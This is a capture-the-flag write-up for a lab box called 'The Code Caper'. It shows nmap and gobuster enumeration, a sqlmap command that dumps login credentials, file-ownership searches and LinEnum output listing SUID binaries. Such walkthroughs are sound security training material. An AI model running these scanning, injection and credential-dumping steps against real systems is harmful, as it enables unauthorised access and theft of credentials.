# The Code Caper - Write-Up by unguest
This write-up may be intended only for those who already finished this box. However, you can have a quick look at it if you're totally lost.

## I - Host enumeration
For this part, I'm using this command : 
```bash
nmap -p 1-1000 -sV -sS <ip>
```

-p 1-1000 => Scan only the 1000 first ports

-sV => Get the services' version (as we're blind for now, I expected to find a vulnerable service with a CVE)

-sS => Perform a SYN-STEALTH scan

Here is the output of the scan : 

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-08 18:40 CEST
Nmap scan report for 10.10.212.142
Host is up (0.029s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.34 seconds

```

From this output, we can have all the informmation needed to answer the three following questions :

### Question 1
We have 2 ports opened on this machine : 22 & 80

### Question 2
The webpage's (http://<ip>/index.html) title is "Apache2 Ubuntu Default Page: It works"

### Question 3
The SSH version is OpenSSH 7.2p2 Ubuntu 4ubuntu2.8

## II - Web Enumeration
For this part, I used gobuster as suggested as long as dirb doesn't handle files but only directories.

```
gobuster dir -x php,txt,html --wordlist /usr/share/wordlists/dirb/big.txt --url <ip>
```

Please note that the path I'm using here only works for the Kali distro. You may need to download it manually if your distro doesn't come with it natively.

```bash
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.212.142
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,html                                                                                                                                                                                                           
[+] Timeout:        10s                                                                                                                                                                                                                    
===============================================================                                                                                                                                                                            
2020/04/08 18:48:50 Starting gobuster                                                                                                                                                                                                      
===============================================================                                                                                                                                                                            
/.htaccess (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.html (Status: 403)
/administrator.php (Status: 200)
```

I stopped the script as soon as I saw the administrator.php file : I knew it was the 'important file' of the server.

## III - Web Exploitation
As I knew their won't be many records in the database, I didn't use the -all sub-flag.

My exploiting command was tho : 

```bash
sqlmap -u <ip>/administrator.php --forms --dump
```

Then we have the 2 credentials that appears... magically :p.

## IV - Command Execution
Firstly, I want to say a big thanks to Psyrkoz#0405 & MuirlandOracle#2721 who debugged me. In fact, This part was the most costful in time on the whole box.

At a glance, I think everyone would use this command : 

```bash
find /* -user pingu
```

But We have many other users and here www-data is our candidate ! 

```bash
find /* -user www-data
```
is returning us 
```bash
 /var/hidden/pass 
 ```
 on its last line, which clearly shows us the way to go !

## V - LinEnum
To 'inject' LinEdum into the system, I ran into a rough and raw solution (that I don't recommend even if I used it) : Copy/Paste the content of [linenum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) through a SSH session (now we have the SSH password of Pingu, let's exploit it !).

Then I ran this command : 

```bash
chmod +x ./linenum.sh
./linenum.sh | grep SUID -A30
```
And as a part of the output, we find this : 

```bash
[-] SUID files:
-r-sr-xr-x 1 root papa 7516 Jan 16 21:07 /opt/secret/root
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 10624 May  8  2018 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
```

As we can see, the first line looks pretty... unusual and it is : It's the answer of this part
